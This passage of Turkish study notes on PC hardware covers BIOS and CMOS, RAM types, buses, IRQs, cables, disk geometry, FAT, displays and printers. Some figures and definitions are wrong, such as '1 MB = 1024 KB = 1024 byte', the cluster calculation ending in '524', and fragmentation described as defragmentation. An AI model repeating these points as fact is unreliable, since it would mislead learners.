gördüğü dataları buradan sağlayabiliyor. İlk çıkan chipler
değiştirilemiyor, update edilemiyordu.
· P-Rom Bios : (Programmable) Daha sonra programlanabilir ROM’lar
çıktı. Teknik servis veya üretici tarafından, ihtiyaç duyulduğunda
extra bilgiler yazılabiliyordu.
· EP-Rom Bios : (Erasable P-Rom) P-Rom’lar silinemiyor, sadece boş
kalan yerlerine data eklenebiliyordu. Bu yüzden EP-Rom’lar üretildi.
Fakat yine teknik servis yapıyor bu işlemi (ultraviyole ışın
göndererek).
· EEP-Rom Bios : (Electronically EP-Rom) Elektronik olarak silinebiliyor fakat yine teknik servis tarafından.
· Flash Bios : Son kullanıcı tarafından, programlar vasıtası ile
update edilebilir. Bu chipler BIOS programını ve default ayarları
tutarlar. Elektrik kesilse bile bilgiler silinmez. Anakartın pilini
çıkartıp taksan bile bilgisayar default ayarlar ile başlarlar.
· CMOS : BIOS ayarları değiştirilip “Save Settings and Exit”
denince, bütün ayarlar CMOS’a (Complementary metal-oxide semiconductor)
yazılır. RAM gibidir, elektrik kesilince içindeki bilgiler gider, bu
yüzden pile ihtiyaç duyar üzerindeki datalar gitmesin diye. (Örneğin
BIOS’a şifre koydun ve unuttun, pili çıkarınca CMOS’daki bilgiler
silinir, ilk açılışta BIOS’daki default ayarlar yukleneceğinden
şifresiz açılır.) BIOS programın bulunduğu chiptir, CMOS ayarların
tutulduğu chiptir. Ayrı ayrı değillerdir, dışarıdan bakıldığında
halogramlı bir chiptir, ikisini de ihtiva eder.
· BIOS Update esnasında elektrik kesilirse, bilgisayar açılmaz ve BIOS chipini değiştirmek gerekir.
· CMOS pilinin ömrü 3-4 senedir, zayıfladığında saat geri kalmaya
başlar, bitince de başta tarih ve saat olmak üzere 01.01.2000 – 00:00
gösterir.
CHAPTER 7. Memory
Lesson 1. ROM and RAM
· Memory ne işe yarar? Dataların saklanması, tutulması için
kullanılan kartlardır. Çalışmakta olan programların datalarının
tutulduğu yerdir, programı kapatınca memory’den silinir.
· Nonvolatile Memory : Kalıcı bellek. Elektrik olsa da olmasa da üzerindeki bilgiler durur. (ROM - Read Only Memory)
· Volatile Memory : Geçici bellek. Elektrik gittiğinde üzerindeki bilgiler gider. (RAM, L1, L2)
· ROM : Non volatile’dir. Üretici firmanın kodladığı bilgileri saklar.
· RAM : Çalışmakta olan programların tutulduğu yerdir. Program kapatılınca memory’den silinir.
· Parity : Data’nın bir yerden bir yere gitmesi sonucu datada bir
bozulma olup olmadığının kontrolü. Her byte’daki tek rakamları sayıp,
sonuç tek ise 1, çift ise 0 Parity Bit’ini ekler data’nın arkasına
Vardığı yerde de aynı kontrolü yapar, sonuçlar eşitse ok.ler. (Ör:
1101011…..1 (5 tane 1 = 5 = tek = 1)) Parity kontrol ucuzdur ama
güvenli değildir. 1’lerin yeri değişse parity bit gene 1 olacak halbuki
data değişti. Parity control her RAM’de standarttır.
· ECC (Error Correction Coding) : Her bit için ayrı ayrı parity bit
gonderir. Çok guvenlidir ama daha yavaştır. Hızlı olması için hardware
destegi lazımdır bu sebeple ECC Rom’lar daha pahalıdır. Server’larda
kullanılır.
· DRAM (Dynamic Ram) : 1 ve 0’lar yani elektriğin olup olmadığı
kapasitorler yardımıyla belirlenir. Kapasitorler, cok hızlı dolup
bosalabildiği için kullanılır. Dolu kapasitorler 1, boş kapasitorler 0
olarak kabul edilir. Kapasitorün 1 değerini alabilmesi için %50 ve daha
fazlasının dolu olması gerekir. Kendi kendine boşaldığı için dynamic
ram. Ucuz ama yavaş.
o Refresh Time : (Altı delik bardak örneği) Bardakların dolu veya
boş kalması, ya da dolu iken boşalması - boş iken dolması için gereken
zamana refresh time denir. Eski RAM’lerde 60 nanosaniye, yenilerde 6
nanosaniye. Kapasitorun 1’den 0’a düşmesi icin gereken zaman refresh
time’dır. (%100’den %49’a)
· SRAM (Statik Ram) : Kullanıldığı tek yer CPU’nun cache
bellekleridir. Cok hızlı ve pahalıdır. (L1 ve L2 bellekler statiktir)
Kapasitorler yoktur yerine flip-flop devre elemanları vardır.
Transistore benzerler, acık veya kapalı durumları vardır. Refresh icin
bir zamana ihtiyac yoktur. Bu yuzden cok hızlıdır. Ne kadar hızlı acıp
kapatabilirsen o kadar hızlı calışırlar, bu yuzden L2 bellekler
bulundukları ortamdaki kartın hızına göre çalışırlar. (Anakart üzerinde
ise anakart hızında, slot üzerindeyse CPU’nun yarısı hızında, CPU
üzerindeyse CPU hızında çalışır. Statik Ram’e normal ışık, dinamik
ram’e apartman ışığı örnek verilebilir, apartman ışığının sonmesi için
belli bir süre geçmesi gereklidir.
· Packaging :
o DIP (Dual Inline Package) : En eski RAM. BIOS chipine ve 8086 CPU’lara benziyor.
 
o SIPP (Single Inline Pinned Package) : Ayakları iğneli RAM.
 
o SIMM (Single Inline Memory Module) : 30 pin ve 72 pin olmak üzere iki çeşit.
 
o DIMM (Dual Inline Memory Module) : 168 pin - son teknoloji.
· BANKING : Artık kullanılmıyor. Eskiden ramler çifter takılmak
zorundaydı, tek ram takarsan çalışmazdı. En son SIMM Ramler dahil
banking yapıyorlardı. Banking’de en onemli kural, Ram’lerin aynı olması
gerekliliği idi. (Or : Ikisi de 16 MB olacak, üzerindeki chipler aynı
sayıda olacak, hızları aynı olacak vs.) DIMM ile beraber tek ram iki
ram gibi calısmaya başladı, böylece kendi içinde banking yapmış oldu.
(Şu an kullanılan SDRAM-DDRAM-RDRAM DIMM’dir.)
· SDRAM (Syncroneus Dynamic Ram) : Anakart ile aynı hızda
çalışırlar. (66 Mhz’lik RAM’i 100 Mhz Anakart’a takamazsın ama 133
Mhz’lik Ram’i 100 Mhz Anakart’a takabilirsin-100 Mhz çalışır.) (Hızları
100-133 Mhz) PII-PIII-PIV
· RDRAM (Rambus Dynamic Ram) : Rambus Dynamic Ram. Anakartın 4 katı
hızda çalışır. CPU’ya olan bağlantısı farklı olduğu için Rambus
deniyor. (Anakart 100 Mhz ise 400 çalışır) (Hızları
400-533-600-800-1000 Mhz) PIV
· DDR RAM (Double Data Rated Dynamic Ram) : Anakartın iki katı hızda
çalışır. (Hızları 200-266-333-433 Mhz) (433 Mhz’de dışarı ile anakart x
2 hızında haberleşir, kendi içinde 433 Mhz çalışır) RDRAM’in çok pahalı
olması sebebiyle üretilmiştir) Şu anda en çok tercih edilen ram’dir.
PIV-AMD
· Caching : CPU’nun, yakın zamanda kullanmayı öngördüğü dataları memory’e yazması. (L1-L2-RAM-Vırtual Memory)
 
(1000 Mhz = Sn’de 1 milyar cycle, 1 sn = 1/1milyar cycle, 1 cycle = 1 ns)
Bunların hızları eşit değil fakat yapılan işin akıcılığı durmamalı.
Bu yüzden CPU caching kullanarak kullanacağı dataları L1,L2,RAM ve
Virtual Memory’e yazıyor. Internet radyo örneği verilebilir.
· Write Through - Write Back : Bazı cache’ler CPU’dan gelen datayı
direkt RAM’e aktarır, bu esnada RAM mesgul ise bekler bu da sistemi
yavaslatır (Write Through). Bazıları ise datayı bekletir ve uygun
zamanda RAM’e aktarır. (Write Back) L1 Cache icinde Data cache WB,
Instruction Cache WT’dir. WB pahalı ama hızlıdır.
Lesson 2. Memory Mapping
· Hexedecimal Code : Binary language (1’ler ve 0’lar) designerlar ve
programcılar için hatırlaması güç bir dildir. Bu yüzden daha kolay
anlaşılabilen 16’lık sistem Hexedecimal kodlar kullanılır.
(1,2,3,4,5,6,7,8,9,A, B,C,D,E,F)
1111 = 15 = F
1011 0001 0011 1111 = 11 1 3 16 = B13Fh (h hexedecimal demek)
· Memory Allocation : Bu bölümde memory’nin CPU kullanımı için nasıl
bölümlendiğini göreceğiz. IBM tarafından üretilen ilk CPU’lar 1 MB’den
fazlasını kullanamıyorlardı. Bunun 640 KB’si OS ve applicationlar için
kullanılıyordu (Conventional Memory). Kalan 384 KB ise BIOS, VideoRAM,
Rom, Hardware için ayrılmıştı (Reserved Memory). (Not : 1MB = 2^20 =
FFFFF) Simdi isletim sistemleri artık 32bit çalıştığından boyle bşr
sınır kalmadı. 1 MB’dan sonraki bölüme Extended Memory denir ve Himem.sys tarafından yönetilir.
· Real Mode : Bir program çalışmaya başlayıp kendisini memory’e
alınca başka programlar memory’de bulunamıyorlar. Program memory’nin
tamamını bloke ediyor.
· Protected Mode : OS devreye giriyor, programa ihtiyacı kadar olan
memory alanını sağlıyor, Böylece başka bir program da baska bir memory
alanına yazılıp aynı anda çalışabiliyor. (Multitasking)
· Shadowing : Bios’un görevi nedir ? Sistem ile ilgili basit
bilgileri tutar. OS Bios’dan bu bilgilere ulasmak isterse ulaşabilir mi
? Ulaşır ama yavaş, bu yüzden BIOS üzerindeki bilgiler RAM’e kopyalanıp
RAM’den okunur.
CHAPTER 8. Expansion Buses, Cables and Connectors
Lesson 1. Understanding Expansion Buses
Expansion Bus, expansion slotların (genişleme yuvalarının) kullandığı busdır. Slotları databus’a bağlayan busdır.
· ISA (Industrial Standart Architecture) : 8bit-8,33Mhz ve
16bit-10Mhz çalışırlar. Performansları düşüktü. Daha sonra MCA (Micro
Channel Architecture) çıktı ama kullanılmadı.
· EISA (Extended ISA) : 32bit-8Mhz çalışır. ISA’dan daha hızlı.
Fiziksel fark, ISA’da çift konnektör var, EISA’da 4 konnektör var.
 
· VESA (Video Electronics Standarts Association) : 32bit-33Mhz
çalışır. Gelişen grafik arabirimleri için tasarlanmıştı. Ekran kartları
hep VESA satılıyordu. Board üzerinde 1’den fazla VESA slot vardı, hem
ekran kartı hem de 3d hızlandırıcılar takılabiliyordu.
· PCI (Peripheral Component Interconnect) : 32bit-33Mhz çalışırlar.
Pentiumlar ile birlikte çıktı, VESA tarih oldu. (32bit=4byte, 4byte x
33 milyon Mhz = 128 Mb/sn). VESA’dan farkı ne ? BUS MASTERING
yapılıyor.
o BUS MASTERING : Eskiden boş slotlara da IRQ veriliyordu. PCI ile
birlikte sadece kart takılı olan slotlara IRQ verilmeye başlandı. Bus
Mastering sayesinde PCI slotlar kontrol edilmeye başlandı ve tüm PCI
slotlara tek IRQ verildi. (Aslında sadece controller’a yani bus
master’a verildi, bus master bunu paylaştırdı, IP sharer gibi)
· PCIX : PCI ile aynı özelliklere sahip, farkı 64bit çalışması. Çok bilinen bir slot değil.
· AGP (Accelerated Graphics Port) : 500 MB/sn data transfer
edebiliyor. Sadece ekran kartı için kullanılır. Ekran kartı üzerinde
kendi RAM’i vardır. Ekran kartının memory’si yetmezse memory’de reserve
ettiğin kadar miktar memory’den kullanılır (Ayarı BIOS’dan yapılır).
Ram’in 1/8’i yeterlidir. (AGP Apperture Size) AGP ile birlikte North
Bridge-South Bridge kavramı çıktı. Hızlı çalışan CPU-RAM-AGP-DMA :
North Bridge, PCI-EISA-FDD-HDD : South Birdge. South Bridge ile North
Bridge birbirlerine bağlı.
AGP 1X = 500 MB/sn
AGP 2X = 1000 MB/sn
AGP 4X = 2000 MB/sn
AGP 8X = 4000 MB/sn
· USB (Universal Serial Bus) : Mouse, printer, modem, keyboard,
joystick, scanner, digital camera gibi external cihazlar bağlanabilir.
o USB portuna 127 tane cihaz bağlanabilir (çoklayıcılar yardımı ile).
o Bilgisayar açıkken bağlantı yapılabilir. (Hot pluggable)
o Hızlı modda 12Mbit/sn=1,5MB/sn, yavaş modda 1,5Mbit/sn=0,2 MB/sn çalışıyorlardı.
o USB 2.0 480Mbit/sn=60MB/sn çalışmak üzere tasarlandı. Çıkma sebebi hız ve Firewire.
· IEEE 1394 FIREWIRE : 400 Mbit/sn = 50 MB/sn. Özellikle Apple’larda
kullanılıyordu. Yavaş yavaş PC’lerde de kullanılmaya başlandı.
Lesson 2. Configuring Expansion Cards
· I/O Adresi : Mektubu gönderdiğin kişinin adresini yazarsın,
arkasına da gönderenin adını yazarsın. Böylece kimden gittiği ve kime
gideceği belli olur. Address Bus üzerinde giden adresler I/O
adresleridir. Her cihazın unique bir I/O adresi vardır. 16 bit’tir ve
hexedecimal kod ile yazılır ki programcılar kolay kullanabilsin diye.
(Sayfa 160 - I/O adres tablosu AT olan onemli, COM1, COM2, LPT,
Keyboard vs bilmek lazım)
COM1 : 03F8 - 03FF
COM2 : 02F8 - 02FH
LPT : 0378 - 037F
KEYB : 0060 - 0063
· Interrupt Request (IRQ) : Cihazların bir oncelik sıralaması
vardır, iki cihaz aynı anda konusamaz. CPU’ya gelen isteklerde CPU bu
oncelik sıralamasını gozonunde bulundurur.
 
o IRQ Controller Chip (8259) CPU’ya ayrı bir wire ile baglıdır
(INTERRUPT WIRE) Aslında iki telden oluşur, INT Read ve INT Write. CPU
gelen isteğin okuma mı yazma mı olduğunu bu tellerden anlıyor.
o Hangi rakam daha küçükse onun kesme isteği önceliklidir.
o IRQ Chip, prioritylere göre kesme isteklerini CPU’ya gönderiyor.
o 2 reserved yani boştur. 8-15 arası 2’yi kullanır.
o 1 keyboard’dır. Diğer butun cihazlara karşı önceliği vardır.
Sistem kilitlense bile CTRL+ALT+DEL veya SHIFT+CTRL+ESC (Task Manager)
basarsan açılır.
o Öncelik sırası 0-1-8-9-10-11-12-13-14-15-2-3-4-5-6-7.
o COM1-COM3 IRQ4, COM2-COM4 IRQ3, LPT1 IRQ7 kullanır.
· DMA : CPU’nun yükünü azaltmak için HDD’den gelen datayı direkt
RAM’e, RAM’den gelen datayı da direkt HDD’ye yazar (8237 Chip). DMA
Channel’i kullanır. Hızlısı Ultra DMA (UDMA).
Lesson 3. Cables and Connectors
· Parallel Port : 25 PIN D Connector Female. (Kablonun ucu male, printer tarafı 36 PIN Centronix Connector)
o BITRONIX : Çift yönlü haberleşme, böylece printer da bilgisayara bilgi gönderebiliyor. (300 KB data transfer hızı)
o EPP (Enhanced Parallel Port) : 2 MB’a kadar data transfer hızı ve
DAISY CHAIN (Printerları birbirlerinin arkasına bağlayarak
çoğaltabil-me imkanı) sağladı.
o ECP (Extended Capabilities Port) : LPT’nin yetenekleri
genişletildi, artık CD-ROM, Scanner, External Storage bağlanabiliyor.
Data transferi 2 MB üzerine çıktı. DMA kullanır. Bağladın ama
görmüyorsa BIOS’da Paralel Port seçeneğini ECP yapacaksın.
· Serial Port : 9 PIN D Connector Male. Mouse, External Modem bağlanır.
· Null Cable : Com veya Lpt’den iki PC’yi bağlamak için kullanılır.
· SCSI Cable : 36 PIN Centronix yapı.
· Keyboard Cable : Eskiden 5 PIN DIN idi (AT Kasalarda), şimdi 6PIN Mini-DIN (PS2) (ATX)
RJ 11 : 2 telli Telefon connectorü
RJ 12 : 4 telli telefon connectörü (dual hat)
RJ 45 : Network connectorü
PS2 (Mini DIN) : Mouse, keyboards and some scanners
Centronix : Printers
USB : Her türlü device.
CHAPTER 9. Basic Disk Drives - CHAPTER 10. Advanced Disk Drive Technology
Lesson 1. Floppy Disk Drives
Eskiler 5 ¼ (720 KB), Yeniler 3 ½ (1.44 MB) (Isımleri, köşeden
köşeye uzunluk’dan geliyor) Avantajları, ufak datalar taşınır, kolay
taşınır. Dezavantajları yavaş, kapasite az.
Floppy kablosunun en ucuna gelirken bir twist var (kablo ikili ise),
eger iki tane floppy takılı ise twistten sonra gelen floppy A olarak
adlandırılır.
Kablonun 34. pininde bir hata varsa, çıkardığın disketin içeriği
yeni disket takınca da görülür, içerik ne kadar disket takarsan tak
değişmez.
Lesson 2. Hard Disk Drives
· IDE (Integrated Device Electronics) : 40 pin. Sadece HDD
bağlanabiliyordu. CD-ROM gibi devicelar bağlanamıyordu. Max. 2 HDD
bağlanabiliyordu. Hızları yavaştı. (≈3,3 - 5 MB/sn)
· EIDE (Enhanced IDE) : 40 pin. Artık tüm devicelar bağlanabiliyor.
(CD-ROM DVD-Backup Drive). Max 2+2 takılabiliyor. Çok daha hızlı (≈150
MB/sn) External Device takılamaz (kasanın arkasında SCSI kart gibi bir
girişi yok).
· Şu anda HDD’ler de CD-ROM’lar da DMA kullanırlar. HDD’ler çok
hızlı oldukları için UDMA kullanırlar. (CD-ROM 1X=150 KB/sn, 52X=7,2
MB/sn, HDD=138 MB/sn)
· UDMA 33, 66, 100, 133 MB/sn. 66 ile beraber kablo yapısı değişti.
Pin sayısı yine 40 ama teller inceldi ve 80 tane oldu. Eklenen teller
topraklama yaptıkları için data geçiren 40 tel birbirlerini parazit
yüzünden etkilememeye başladılar. Bu kablo yapısı sayesinde hız arttı.
· CD-ROM’lar UDMA değil PIO Mode kullanıyorlar. (Programmed I/O -
DMA UDMA arası bir mode) CD-ROM’un üzerinde, içinde programlanmış
kopyalama instructionları olan bir chip var. Bu yüzden daha hızlı data
aktarımı yapabiliyor (PIO Mode 4 = 16,6 MB/sn)
· HDD kablosunda board’a yakın olan (ortadaki) jack’i takarsan ve
cable select seçili ise HDD Slave olur. Uzaktaki jack’i takarsan ve
cable select seçili ise Master olur HDD.
· HDD’nin içindeki disk’e (platter) okuyucu yazıcı kafa (pikap
iğnesi gibi) kesinlikle değmez. HDD’ler manyetik okur-yazar, CD’ler
optik okur yazar. HDD’ler vakumludur, kapağı açılırsa bozulurlar.
Okuyucu yazıcı kafanın bacağında mıknatıslar var, mıknatıslara verilen
değişik miktardaki elektrik akımı sayesinde kafa ileri geri hareket
eder. Eskiden park diye bir komut vardı, bilgisayarı taşıyacağınız
zaman önce park yazıp kafayı parking zone’a çekerdiniz ki kafa
platter’a değmesin. Şu anda ise mıknatıs olduğu için, elektrik
kesilince otomatik olarak parka çekiliyor.
· HDD GEOMETRY :
o Kafa Sayısı (Head) : Max 16 tane olabilir. 1 platter’i 2 kafa okur. Kaç plaka varsa 2 katı head olur.
o Track : Plaklardaki oyuklara benzeyen, içten dışa doğru çemberler.
o Silindir Sayısı (Cylinder) : Birkaç platter üst üste gelince her
plakadaki aynı trackler silindiri oluştururlar. (4 plaka var, her
plakada 100 track varsa toplam 100 adet cylinder vardır) Bios en fazla
1024 cylinder sayısını elle girmene izin verir.
o Sector per Track : Bir track en fazla 63 birbirine eşit dilime
bölüne-bilir. Bunlara sector denir. 1 sector 512 byte data alabilir.
o HDD KAPASİTESİ = CHS = CYLINDER x HEAD x SECTOR PER TRACK
= 1024 x 16 x 63 x 512 = 528.482.304 byte
= 504 MB (1 MB = 1024 KB = 1024 byte)
Yani BIOS sadece 504 MB HDD kapasitesini tanıyabiliyordu eskiden.
Daha sonra kapasiteler artınca ya HDD’ler kendi BIOS’larını kullanarak
BIOS’u bypass ettiler, ya da BIOS’a farklı seyler hesaplattılar.
o Logical Block Addressing (LBA) : Yüksek kapasiteli HDD’leri
kullanabilmek için artık BIOS’a kapasite değil, silindir sayısı
hesapla-tılıyor. LBA ile birlikte BIOS’da Auto Detect özelliği geldi.
Artık değer-leri elle yazmaya gerek yok, BIOS kendisi detect edebiliyor.
Cylinder = Capacity / (Head x SPT x 512)
· HDD Tipleri : Eskiden ST506 ve ESDI vardi, artik yoklar.
o IDE/EIDE : PC’lerde buyuk yuzde ile kullanılan HDD tipidir.
Onceleri IDE kullanılırdı, EIDE controller ile beraber EIDE HDD’ler
kullanılmaya başlandı. EIDE ile birlikte artık daha buyuk kapasiteli
HDD’ler kullanılabiliyor, UDMA 66-133 ile birlikte daha hızlı data
transferi yapıla-biliyor.
o SCSI (Small Computer System Interface) : Ozellikle Server’lar ve
yuksek kapasiteli Workstation’lar için tasarlanmış HDD’lerdir.
Anakart’a bağlantısı EIDE disklerden tamamen farklıdır, kendi SCSI
controllerı aracılığı ile bağlanır. SCSI Controller’a 7 tane device
bağlayabiliyorduk (SCSI-1). Şimdi SCSI-2 ve SCSI-3’de 15 ID
verilebiliyor, SCSI-3’lerde de her ID’ye 7’şer tane Logical Unit Number
(LUN) verilebiliyor (Toplam 105 tane device).
o SCSI-EIDE Farkları :
· Anakart’a bağlantı şekilleri tamamen farklı, SCSI control kartları PCI slot’a bağlanır.
· SCSI’ler 15.000 Rpm’lere çıkabiliyor. EIDE 7200 Rpm.
· SCSI’de Master-Slave kavramı yok. SCSI Id var, 0,1,2.. diye gidiyor. Ama once gelenin priority’si var.
· EIDE en çok 4 HDD bağlanabilir, SCSI-3 toplam 105.
· EIDE HDD’den birsey kopyalarken aynı anda 2-3 kopya yaparsan
bilgisayar cok yavaslar, SCSI’de boyle birsey yok, örneğin CD’den data
kopyalarken aynı anda CD-R yazabilirsin.
· SCSI controller çok güçlü elektrik sinyali gönderdiği için geri
yansımalar parazit yapıyor, engellemek için en sondaki HDD’ye
sonlandırıcı takılıyor(du). Artık yok çünkü her device’ın üzerinde
sonlandırıcı zaten var.
· EIDE’ye sadece mass storage, SCSI’ye scanner bile bağlanabilir.
· EIDE’ye external device bağlanamaz, SCSI kartların external girişleri vardır, external device bağlanabilir.
· Low-Level Formatting : Eskiden son kullanıcı yapardı, low-level
format’ta sector, track, cylinder ve head ayarları yapılıyordu. Bozuk
sector falan varsa onarılabiliyordu fakat artık sirketler bunu son
kullanıcıya yaptırmak istemediklerinden (cunku kullanıcılar hata
yapıyorlardı ve HDD’ler çöpe atılmak zorunda kalıyordu) artık fabrikada
yapıyorlar bu işlemi.
Win9x-Me kurulumlarında, kuruluma başlamadan önce HDD yeni ise,
formatlamak gerekir (High Level Format). Bunun için elimizde bir
bootable floppy disket olması gerekir. Yaratmak için, Win9x-Me kurulu
PC’de,
format a: /s
yazarak, sistem dosyaları ile birlikte bootable floppy oluşturmuş
oluruz. Bunlara ek olarak FORMAT.COM ve FDISK.COM dosyalarını da
diskete kopyalamalıyız.
· Partitioning : Elimizde bulunan HDD’yi partitioning sayesinde 1-24 (C to Z) Mantıksal Bölüme ayırabiliriz. Neden ? Data organizasyonunu kolaylaştırmak için ve de birden çok OS kurabilmek için.
o Primary-Extended Partition : Primary, üzerinde boot sector olan
partition’dur. Fdisk ile bir primary partition yaratılabilir, diğer 23
tanesi Extended olarak yaratılabilir (logical drives). Nasıl
yaratılacağı OS kısmında ayrıntılı anlatılacak.
· File Allocation Tables (FAT) : Disk drive’larda yazılabilen en küçük birim sector’dür.
Bir sector 512 byte data alabilir. 512 byte’dan küçük dosyalar (2 byte
bile olsalar) 1 sector yer kaplarlar ve o sectore başka dosya
yazılamaz. Bu şekilde, o sector’de kalan boş alan israf edilmiş olur.
512 byte’dan büyük dosyalar da birden çok sector’e yazılırlar. FAT,
hangi datanın hangi sectör’e yazıldığını ve hangi sectörlerin dolu-boş
olduğu bilgisini tutar. Clustering sayesinde arka arkaya gelen
sectorler birleştirilerek tek bir unit olarak FAT’a gösterilir, bu
sayede yer kaybı azaltılmış olur. Max 64,000 cluster olabilir. Sectors
per Cluster sayısı partition boyutuna bağlıdır. Örneğin
Partition : 32MB=33,554,432 bytes
Total Sectors : 33,554,432/512=65,536
Sectors per Cluster : 65,536/64,000=1,024=1
Bytes per Cluster : 1,024 x 512 = 524
· Fragmentation : Cluster üzerindeki dosyalar silinindikçe, boşalan
yerlere yeni dosyalar yazılır. Fakat silinen dosya ile yazılan dosyanın
boyutları aynı olmayabileceğinden, o clusteri dolduran dosya, diğer boş
bulduğu clusterlara da kendisini yazmaya devam eder. Bu yüzden dosyanın
bazı parçaları HDD’nin farklı yerlerinde olabilir ve bu da yavaşlamaya
sebep olur. Fragmentation, bu dosyaları ardışık clusterlara yazarak
HDD’nin okuma hızını arttıran işleme denir.
· Disk Compression : Clusterlarda boş kalan yerleri değerlendirerek
kullanma işlemi. Fat32’de compressing yok çünkü cluster size’lar zaten
düşürüldü.
CHAPTER 11. The Display System
Lesson 1. Monitors
Monitörler bildiğimiz televizyonlara benzerler. Tek farkları
monitörler broadcast sinyalleri ile değil, PC içerisinde yer alan ekran
kartından gelen sinyaller ile çalışırlar. Ekran kartı ne kadar kaliteli
ise monitörden alacağınız kalite o kadar iyi olur.
· The CRT (cathode-ray tube) : Tüplü monitörlerin içinde,
Red-Green-Blue (RGB) renklerini ve bunların karışımı ile tüm renkleri
ekrana yansıtan elektron tabancası yer almaktadır. Bu ışınlar
deflection coil’ler yardımı ile tüm ekrana yansıtılır.
Eskiden ekranlar bombeliydi, sebebi, her noktanın merkeze eşit
uzaklıkta olması gerektiği idi. Çünkü düz olsaydı aşağıdaki şekilde
gorüldüğü gibi 2 daha önce belirecekti.
 
Daha sonra değişik yöntemler kullanarak düz ekran yaptılar. (Flat screen)
Flat screen ile LCD aynı şey değildir.
· Refresh Rate :
 
Horizontal scan, soldan sağa kadar yapılan scan’dir (HRR). (Printer gibi)
Horizontal ve vertical retrace, scan yapan kafanın geri dönmesidir.
Refresh Rate, iki START arası geçen zamandır. Ölçü birimi Hertz’dir. (Hertz, saniyede x kez demek, 85 Hertz saniyede 85 kez)
İnsan gözü saniyede 80-85 Hertz civarı çalışır. Monitörü 80 Hz
altına düşürürsen titremeye başlar, bunun sebebi monitörün tazeleme
oranı gözünüzün hızına yetişemiyor demektir.
· Resolution (Çözünürlük) : Ekran karelerden oluşur (pixel). Bu
kareler ne kadar küçük olursa ekrana o kadar çok kare sığar. 640×480
çözünürlük, yatayda 640, dikeyde 480 tane pixel olduğunu belirtir.
Çözünürlük arttıkça gözün ihtiyaç duyduğu refresh rate de artar.
1280×1024 - 85 Hz çalışan monitör iyi bir monitördür. Monitörün
kalitesi, yüksek çözünürlükte basabildiği refresh rate’den belli olur.
Normal TV-Monitör oranı 4:3 ‘dür. Sinema oranı 16:9 ‘dur. O yüzden
sinema filmi altta üstte siyah çıkar televizyonda. İnsanın görme oranı
? 1:1
· Dot Pitch (Nokta Aralığı) : Monitör üzerine düşen her renk bir
dot’dur. (RGB) Monitörün gösterebileceği en küçük birim pixel’dir. Bir
pixelin içine birçok nokta sığdırılabilir. Pixel ne kadar ufak ve
alabildiği nokta ne kadar çoksa görüntü kalitesi o kadar iyidir.
Nokta aralığı, iki aynı renk nokta arası mesafedir. (R-R, G-G, B-B)
0,24-0,25 mm civarındadır. Ne kadar ufaksa o kadar iyidir. (Printer
gibi, düşük kalitede basarsan nokta aralığını arttırır ve daha az
kaliteli basar)
· FPD (Flat Panel Display) : Tüp olmadığı için daha az yer
kaplarlar. CRT monitörlere göre daha pahalıdırlar. Daha az ekran
kartına uyumludurlar ve çözünürlük alternatifleri daha azdır. Görüntü
kalitesi sağdan soldan bakınca biraz düşebilir. En önemlisi CRT gibi
radyasyon yaymazlar.
o LCD (Liquid Cyrstal Display) : Kesit alırsak, iki cam arası
sandvic yapıda saydam bir sıvı var. Elektrik verildiğinde kristalize
olarak renklenir ve görüntü oluşur. Ömrü 10-12 senedir. Iki tipi var :
§ Passive Matrix Display : Günümüzde kullanılmıyor artık. Görüntü
kalitesi daha kötü, görüş açısı daha azdır. Refresh rate’i daha azdır.
Bankamatikler için idealdir. Satır ve sütun başına 1’er transistör
düşer.
§ Active Matrix Display : Görüntü kalitesi, görüş açısı, refresh
rate daha iyidir. Daha pahalıdır. Her pixel’e 1 transistör düşer. Bu
yüzden refresh rate’leri çok hızlıdır.
Passive Matrix’de A noktasına renk vermek istenince yatay ve dikey
noktalardan 1,5’ar volt elektrik veriliyor fakat elektrik diğer
pixellerden de geçeceği için çok hafif de olsa çizgiler görünür. Active
Matrix’de her pixelde 1 transistör olduğundan sadece o transistöre
elektrik verilir ve bu yüzden çizgi falan görünmez.
o Plazma : Florasan ışığı gibi bir görüntü mantığı ile çalışır. Çok
büyük ekranlar için üretilmiştir. Contast ve parlaklığı daha azdır,
daha ucuzdur ama ömrü de azdır. (4-5 sene) Plazma TV’lerde tuner
yoktur, normal anten bağlanamaz, digital uydu seyredilebilir. (Digiturk
gibi)
· Display Adapters :
o İlk ekran kartları MDA (Monocrome Display) : Siyah-beyaz sadece.
o CGA (Colour Graphics Display) : 2 ve 4 renk çalışıyordu. (Text görüntü)
o EGA (Enhanced Graphics Display) : 16 renk çalışıyordu. Text-16 renk, grafik-8 renk.
o VGA (Video Graphics Adapter) : 640×480 ve 16bit renk standart. Windows 3.1 ile çıktı.
o SVGA (Super VGA) : Ekran kartlarının tetenekleri geliştirildi. 800×600 16bit minimum.
Şu an ekran kartlarının %98’i DDR Memory kullanırlar. Kendi processorleri vardır : GPU
· Troubleshooting :
o Tüm kabloların takılı olduğunu kontrol et.
o Ekran kartı anakarta tam oturmuş mu kontrol et.
o Reboot et. Eğer POST esnasında görüntü varsa OS’de problem.
o 640×480 60 Hz’e resetle kartı. Çalışıyorsa driverları kontrol et.
o Monitörün destekleyebildiği refresh rate’den fazlasını uygulama.
CHAPTER 12. Printers
· DOT MATRIX : Daktilo gibidir. Kağıdın üzerine mürekkepli şerit
gelir, baskı kafası şeride vurarak mürekkebin şeride geçmesi sağlanır.
9/25 pin modları vardır. Birinde aynı anda 9 pin vurur (kötü baskı),
diğerinde aynı anda 25 pin vurur (daha kaliteli baskı).
Dot matrix, daha çok karbon kopya yapılacaksa veya muhasebede devamlı kağıda baskı yapılacaksa kullanılır.
· INKJET PRINTER : Mürekkep püskürtmeli printer. İki çeşidi vardir :
o Bubblejet : İçindeki mürekkebi ısıtır, Isınan mürekkep genleşir ve delikten püskürür.
o Inkjet : Elektrik verilerek partiküller hızlandırılır ve püskürtülür.
· LASER PRINTER :
 
1. Cleaning : Drum üzerinde kalan metal tozları temizlenir.
2. Charge the Drum : Belli yoğunlukta elektrik verilerek drum şarj edilir. (Drum üzerinde statik elektrik birikir.)
3. Writer Image : Imajın oluşturulacağı bölümlere laser ışınları gönderi-lip o bölümler geçici süre için yakılır.
4. Transfer Toner : Tonerin içi metal tozu ile dolu. Metal tozu, laser ile yakılan bölümlere yapışır.
5. Transfer Image to Paper : Mıknatıs yardımı ile, drum’a yapışan
tozlar kağıda doğru çekilir. (Tozların %90’dan fazlası kapıda yapışır.)
Statik eliminator, kağıt üzerinde biriken statik elektriği giderir.
6. Fuse image to paper : Fırınlama işlemi yapılır. Alttaki drum ısıtır, üstteki drum pres yapar.
CHAPTER 13. Portable Computers
